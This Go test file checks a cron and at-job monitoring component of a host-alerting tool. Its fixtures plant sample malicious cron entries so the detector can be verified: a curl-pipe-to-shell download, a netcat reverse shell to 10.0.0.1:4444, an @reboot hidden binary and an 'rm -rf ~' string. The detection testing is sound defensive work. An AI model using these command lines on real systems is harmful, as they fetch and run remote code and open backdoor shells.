package cronwatch

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/penguinpowernz/fogbot/internal/notifier"
	"github.com/penguinpowernz/fogbot/internal/skills"
)

func TestMain(m *testing.M) {
	settle = 200 * time.Millisecond
	os.Exit(m.Run())
}

func TestShippedYAML(t *testing.T) {
	cfgs, err := skills.LoadAvailable("../../../usr/share/fogbot/contrib/skills-available")
	if err != nil {
		t.Fatal(err)
	}
	for _, cfg := range cfgs {
		if cfg.ID != SkillID {
			continue
		}
		c := NewFromConfig(cfg)
		if strings.Join(c.watchPaths, " ") != strings.Join(defaultWatchPaths, " ") {
			t.Fatalf("shipped watch_paths %v differ from the code default %v", c.watchPaths, defaultWatchPaths)
		}
		return
	}
	t.Fatalf("skill %d not found in shipped YAML", SkillID)
}

func TestConfigureRejectsRelativePath(t *testing.T) {
	c := New()
	if err := c.Configure(map[string]interface{}{"watch_paths": []interface{}{"etc/cron.d"}}); err == nil {
		t.Fatal("expected an error for a relative path")
	}
}

func TestAdded(t *testing.T) {
	got := added([]string{"a", "b", "b"}, []string{"b", "a", "b", "b", "c"})
	if strings.Join(got, ",") != "b,c" {
		t.Fatalf("got %v", got)
	}
}

func TestJobLines(t *testing.T) {
	got := jobLines("# m h dom mon dow command\n\nSHELL=/bin/sh\n  * * * * * root id  \n")
	if strings.Join(got, "|") != "SHELL=/bin/sh|* * * * * root id" {
		t.Fatalf("got %q", got)
	}
}

func TestIgnoredName(t *testing.T) {
	for name, want := range map[string]bool{
		".SEQ": true, ".job.swp": true, "job~": true,
		// cronie runs these from /etc/cron.d
		"logrotate.dpkg-new": false, "=x": false,
		"a0001a01a2b3c4": false, "root": false, "backdoor": false,
	} {
		if got := ignoredName(name); got != want {
			t.Errorf("ignoredName(%q) = %v, want %v", name, got, want)
		}
	}
}

func TestAtRunning(t *testing.T) {
	for path, want := range map[string]bool{
		"/var/spool/cron/atjobs/=0001a": true,
		"/var/spool/at/=0001a":          true,
		"/var/spool/cron/atjobs/a0001a": false,
		"/etc/cron.d/=x":                false,
	} {
		if got := atRunning(path); got != want {
			t.Errorf("atRunning(%q) = %v, want %v", path, got, want)
		}
	}
}

func TestClean(t *testing.T) {
	if got := clean("rm -rf ~ \u202e#\nforged\x00\xff"); got != "rm -rf ~ ?#?forged??" {
		t.Fatalf("got %q", got)
	}
}

// watch starts the skill on paths and returns its alerts
func watch(t *testing.T, paths ...string) <-chan notifier.Alert {
	t.Helper()
	list := make([]interface{}, len(paths))
	for i, p := range paths {
		list[i] = p
	}
	c := New()
	c.dpkgLocks = []string{filepath.Join(t.TempDir(), "lock")}
	if err := c.Configure(map[string]interface{}{"watch_paths": list}); err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	alerts, err := c.Watch(ctx)
	if err != nil {
		t.Fatal(err)
	}
	return alerts
}

func next(t *testing.T, alerts <-chan notifier.Alert) notifier.Alert {
	t.Helper()
	select {
	case a := <-alerts:
		return a
	case <-time.After(5 * time.Second):
		t.Fatal("no alert")
	}
	return notifier.Alert{}
}

func none(t *testing.T, alerts <-chan notifier.Alert) {
	t.Helper()
	select {
	case a := <-alerts:
		t.Fatalf("unexpected alert: %s: %s (%s)", a.Title, a.Activity, a.Equipment)
	case <-time.After(2 * settle):
	}
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func TestWatchDirectory(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "cron.d")
	if err := os.Mkdir(dir, 0755); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(dir, "existing"), "0 * * * * root true\n")
	alerts := watch(t, dir)

	// crontab(1) and editors write a temporary file and rename it into place
	tmp := filepath.Join(dir, "tmp.12345")
	write(t, tmp, "# comment\n*/5 * * * * root curl -s http://x | sh\n")
	if err := os.Rename(tmp, filepath.Join(dir, "backdoor")); err != nil {
		t.Fatal(err)
	}
	a := next(t, alerts)
	if a.Title != "New Scheduled Job" || a.Severity != notifier.SeverityContact || a.Location != filepath.Join(dir, "backdoor") {
		t.Fatalf("got %+v", a)
	}
	if a.Equipment != "+ */5 * * * * root curl -s http://x | sh" {
		t.Fatalf("equipment %q", a.Equipment)
	}
	none(t, alerts) // nothing for the temporary file

	f, err := os.OpenFile(filepath.Join(dir, "existing"), os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	f.WriteString("@reboot root /tmp/.x\n")
	f.Close()
	a = next(t, alerts)
	if a.Title != "Scheduled Job Changed" || a.Equipment != "+ @reboot root /tmp/.x" {
		t.Fatalf("got %+v", a)
	}

	if err := os.Chmod(filepath.Join(dir, "existing"), 0755); err != nil {
		t.Fatal(err)
	}
	a = next(t, alerts)
	if a.Title != "Scheduled Job Changed" || !strings.Contains(a.Equipment, "mode -rw-r--r-- → -rwxr-xr-x") {
		t.Fatalf("got %+v", a)
	}

	// Rewritten unchanged, and a file no scheduler would run
	write(t, filepath.Join(dir, "existing"), "0 * * * * root true\n@reboot root /tmp/.x\n")
	write(t, filepath.Join(dir, ".existing.swp"), "x")
	none(t, alerts)

	if err := os.Remove(filepath.Join(dir, "backdoor")); err != nil {
		t.Fatal(err)
	}
	a = next(t, alerts)
	if a.Title != "Scheduled Job Removed" || a.Severity != notifier.SeverityMovement {
		t.Fatalf("got %+v", a)
	}
}

func TestWatchFile(t *testing.T) {
	etc := t.TempDir()
	crontab := filepath.Join(etc, "crontab")
	write(t, crontab, "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
	alerts := watch(t, crontab)

	// Other files in the same directory don't matter
	write(t, filepath.Join(etc, "hosts"), "127.0.0.1 localhost\n")
	none(t, alerts)

	// Replaced by rename, as editors do
	tmp := filepath.Join(etc, "crontab.new")
	write(t, tmp, "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n* * * * * root nc -e /bin/sh 10.0.0.1 4444\n")
	if err := os.Rename(tmp, crontab); err != nil {
		t.Fatal(err)
	}
	a := next(t, alerts)
	if a.Title != "Scheduled Job Changed" || a.Equipment != "+ * * * * * root nc -e /bin/sh 10.0.0.1 4444" {
		t.Fatalf("got %+v", a)
	}
}

func TestWatchDirectoryCreatedLater(t *testing.T) {
	spool := t.TempDir()
	atjobs := filepath.Join(spool, "atjobs")
	alerts := watch(t, atjobs)

	if err := os.Mkdir(atjobs, 0770); err != nil {
		t.Fatal(err)
	}
	a := next(t, alerts)
	if a.Title != "New Scheduled Job" || a.Size != "1 directory" {
		t.Fatalf("got %+v", a)
	}

	write(t, filepath.Join(atjobs, "a0000101a2b3c4"), "#!/bin/sh\n/tmp/payload\n")
	a = next(t, alerts)
	if a.Location != filepath.Join(atjobs, "a0000101a2b3c4") || a.Equipment != "+ /tmp/payload" {
		t.Fatalf("got %+v", a)
	}
}

func TestWatchNothingWatchable(t *testing.T) {
	c := New()
	c.Configure(map[string]interface{}{"watch_paths": []interface{}{"/nonexistent/fogbot/cron.d"}})
	if _, err := c.Watch(context.Background()); err == nil {
		t.Fatal("expected an error when no path can be watched")
	}
}

func TestDpkgDowngrades(t *testing.T) {
	c := New()
	a, ok := c.classify("/etc/cron.daily/apt-compat", entry{}, false, entry{lines: []string{"x"}}, true, true)
	if !ok || a.Severity != notifier.SeverityMovement || !strings.Contains(a.Unit, "dpkg was running") {
		t.Fatalf("got %+v", a)
	}
}

// crondir makes a watched cron.d and returns its path and the alerts
func crondir(t *testing.T) (string, <-chan notifier.Alert) {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "cron.d")
	if err := os.Mkdir(dir, 0755); err != nil {
		t.Fatal(err)
	}
	return dir, watch(t, dir)
}

func TestWatchSymlink(t *testing.T) {
	dir, alerts := crondir(t)
	target := filepath.Join(t.TempDir(), "job")
	write(t, target, "* * * * * root /tmp/x\n")
	if err := os.Symlink(target, filepath.Join(dir, "link")); err != nil {
		t.Fatal(err)
	}
	a := next(t, alerts)
	if a.Size != "1 symlink" || a.Equipment != "→ "+target+"; + * * * * * root /tmp/x" {
		t.Fatalf("got %+v", a)
	}
}

func TestWatchFIFODoesntHang(t *testing.T) {
	dir, alerts := crondir(t)
	if err := syscall.Mkfifo(filepath.Join(dir, "fifo"), 0644); err != nil {
		t.Fatal(err)
	}
	a := next(t, alerts)
	if a.Location != filepath.Join(dir, "fifo") {
		t.Fatalf("got %+v", a)
	}
	// Still watching
	write(t, filepath.Join(dir, "after"), "x\n")
	if a := next(t, alerts); a.Location != filepath.Join(dir, "after") {
		t.Fatalf("got %+v", a)
	}
}

func TestWatchNamesCronieRuns(t *testing.T) {
	dir, alerts := crondir(t)
	write(t, filepath.Join(dir, "=x"), "x\n")
	write(t, filepath.Join(dir, "y.dpkg-old"), "y\n")
	got := map[string]bool{next(t, alerts).Location: true, next(t, alerts).Location: true}
	if !got[filepath.Join(dir, "=x")] || !got[filepath.Join(dir, "y.dpkg-old")] {
		t.Fatalf("got %v", got)
	}
}

func TestWatchAtJobRunning(t *testing.T) {
	atjobs := filepath.Join(t.TempDir(), "atjobs")
	if err := os.Mkdir(atjobs, 0770); err != nil {
		t.Fatal(err)
	}
	job := filepath.Join(atjobs, "a0000101a2b3c4")
	write(t, job, "/tmp/payload\n")
	alerts := watch(t, atjobs)

	// atd renames the job while it runs it, then removes it
	if err := os.Rename(job, filepath.Join(atjobs, "=0000101a2b3c4")); err != nil {
		t.Fatal(err)
	}
	if a := next(t, alerts); a.Title != "Scheduled Job Removed" || a.Location != job {
		t.Fatalf("got %+v", a)
	}
	none(t, alerts)
}

func TestWatchDirectoryRemoved(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "cron.d")
	if err := os.Mkdir(dir, 0755); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(dir, "job"), "x\n")
	alerts := watch(t, dir)

	if err := os.Rename(dir, dir+".bak"); err != nil {
		t.Fatal(err)
	}
	got := map[string]bool{next(t, alerts).Location: true, next(t, alerts).Location: true}
	if !got[dir] || !got[filepath.Join(dir, "job")] {
		t.Fatalf("got %v", got)
	}

	// A change in the moved directory is no longer reported as in cron.d
	write(t, filepath.Join(dir+".bak", "job"), "y\n")
	none(t, alerts)

	// Nor is a job in the new one compared with the old one
	if err := os.Mkdir(dir, 0755); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(dir, "job"), "x\n")
	got = map[string]bool{}
	for i := 0; i < 2; i++ {
		a := next(t, alerts)
		if a.Title != "New Scheduled Job" {
			t.Fatalf("got %+v", a)
		}
		got[a.Location] = true
	}
	if !got[dir] || !got[filepath.Join(dir, "job")] {
		t.Fatalf("got %v", got)
	}
}
